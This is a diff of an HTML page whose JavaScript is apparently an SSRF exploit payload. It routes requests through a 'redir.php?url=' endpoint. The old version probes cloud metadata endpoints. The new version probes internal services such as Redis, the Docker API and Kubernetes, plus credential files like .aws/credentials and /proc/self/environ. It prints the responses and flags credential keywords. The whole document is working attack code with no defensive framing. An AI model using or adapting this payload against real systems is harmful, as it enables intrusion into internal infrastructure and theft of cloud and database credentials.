@@ -1,76 +1,90 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Cloud & Version Detection</title>
+    <title>Internal Environment Discovery</title>
 </head>
 <body>
-    <h1>☁️ Cloud Provider & Version Intelligence</h1>
+    <h1>🔍 Internal Environment & Process Discovery</h1>
     <div id="results"></div>
     
     <script>
         var results = "";
         
-        // Test different cloud metadata endpoints to identify provider
-        var cloudTests = [
-            // AWS variants
-            'http://169.254.169.254/',
-            'http://169.254.169.254/latest/',
-            'http://169.254.169.254/latest/meta-data/',
-            'http://169.254.169.254/1.0/meta-data/',
-            'http://169.254.169.254/2007-01-19/meta-data/',
-            'http://169.254.169.254/2008-02-01/meta-data/',
-            'http://169.254.169.254/2009-04-04/meta-data/',
-            'http://169.254.169.254/2011-01-01/meta-data/',
-            'http://169.254.169.254/2016-09-02/meta-data/',
+        // Look for environment variables and internal services
+        var envTests = [
+            // Environment variable endpoints
+            'http://httpbin.org/anything/env',  // Might reflect server env vars
             
-            // Google Cloud
-            'http://metadata.google.internal/',
-            'http://metadata.google.internal/computeMetadata/',
-            'http://metadata.google.internal/computeMetadata/v1/',
-            'http://metadata.google.internal/computeMetadata/v1/instance/',
+            // PHP specific info gathering
+            'http://localhost/?phpinfo',
+            'http://localhost/index.php?info',
+            'http://localhost/test.php?phpinfo',
             
-            // Azure
-            'http://169.254.169.254/metadata/',
-            'http://169.254.169.254/metadata/instance/',
+            // Common internal ports and services
+            'http://localhost:9000/',  // Often used for internal services
+            'http://localhost:9001/',
+            'http://localhost:6379/',  // Redis
+            'http://localhost:3306/',  // MySQL
+            'http://localhost:5432/',  // PostgreSQL
+            'http://localhost:11211/', // Memcached
+            'http://localhost:8080/manager/', // Tomcat
+            'http://localhost:8080/status/',
             
-            // DigitalOcean
-            'http://169.254.169.254/metadata/',
-            'http://169.254.169.254/metadata/v1/',
-            'http://169.254.169.254/metadata/v1.json',
+            // Docker/container specific
+            'http://localhost:2375/', // Docker API
+            'http://localhost:2376/', // Docker API SSL
+            'http://unix:/var/run/docker.sock/', // Docker socket
             
-            // Oracle Cloud
-            'http://169.254.169.254/opc/',
-            'http://169.254.169.254/opc/v1/',
-            'http://169.254.169.254/opc/v2/',
+            // Kubernetes
+            'http://kubernetes.default.svc.cluster.local/',
+            'http://kubernetes.default.svc.cluster.local/api/',
             
-            // Alibaba Cloud
-            'http://100.100.100.200/',
-            'http://100.100.100.200/latest/',
+            // Local credential files
+            'http://localhost/wp-config.php',
+            'http://localhost/config/database.yml',
+            'http://localhost/config/app.yml',
+            'http://localhost/.aws/config',
+            'http://localhost/.aws/credentials',
             
-            // Check for version/debug endpoints
-            'http://localhost/version',
-            'http://localhost/debug',
-            'http://localhost/.git/config',
-            'http://localhost/.env',
-            'http://localhost/composer.json',
-            'http://localhost/package.json'
+            // Process/system info
+            'http://localhost/proc/version',
+            'http://localhost/proc/cpuinfo',
+            'http://localhost/proc/meminfo',
+            'http://localhost/proc/net/arp',
+            'http://localhost/proc/self/environ',
+            
+            // Check for backup/old files
+            'http://localhost/backup.sql',
+            'http://localhost/database.sql',
+            'http://localhost/dump.sql',
+            'http://localhost/config.bak',
+            'http://localhost/config.old',
+            'http://localhost/aws-credentials.bak',
+            'http://localhost/credentials.txt'
         ];
         
-        for(var i = 0; i < cloudTests.length; i++) {
+        for(var i = 0; i < envTests.length; i++) {
             try {
-                results += "<h4>Test " + (i+1) + ": " + cloudTests[i] + "</h4>";
+                results += "<h4>🔍 " + envTests[i] + "</h4>";
                 var xhr = new XMLHttpRequest();
-                xhr.open('GET', 'http://localhost/redir.php?url=' + cloudTests[i], false);
+                xhr.open('GET', 'http://localhost/redir.php?url=' + envTests[i], false);
                 xhr.send();
                 
-                if(xhr.responseText && xhr.responseText.trim().length > 0) {
-                    results += "<div style='background:#e8f5e8;padding:8px;border:1px solid green;'>🎯 FOUND RESPONSE: " + xhr.responseText.length + " bytes</div>";
-                    results += "<div style='background:#f0f0f0;padding:8px;font-size:11px;max-height:100px;overflow:scroll;word-wrap:break-word;'>" + xhr.responseText + "</div>";
+                if(xhr.responseText && xhr.responseText.trim().length > 3) {
+                    results += "<div style='background:#e8f5e8;padding:8px;border:1px solid green;'>🎯 DISCOVERY: " + xhr.responseText.length + " bytes</div>";
+                    
+                    // Look for AWS-related keywords
+                    var text = xhr.responseText.toLowerCase();
+                    if(text.includes('aws') || text.includes('s3') || text.includes('access') || text.includes('secret') || text.includes('key')) {
+                        results += "<div style='background:#ffff00;padding:5px;border:2px solid red;'>🚨 CONTAINS AWS/CREDENTIAL KEYWORDS! 🚨</div>";
+                    }
+                    
+                    results += "<div style='background:#f0f0f0;padding:8px;font-size:10px;max-height:120px;overflow:scroll;white-space:pre-wrap;'>" + xhr.responseText.substring(0, 1000) + "</div>";
                 } else {
-                    results += "<div style='background:#ffe8e8;padding:2px;'>❌ Empty</div>";
+                    results += "<div style='background:#ffe8e8;padding:2px;'>❌ No data</div>";
                 }
             } catch(e) {
-                results += "<div style='background:#ffe8e8;padding:2px;'>❌ Failed</div>";
+                results += "<div style='background:#ffe8e8;padding:2px;'>❌ " + e.message.substring(0, 50) + "</div>";
             }
         }
         
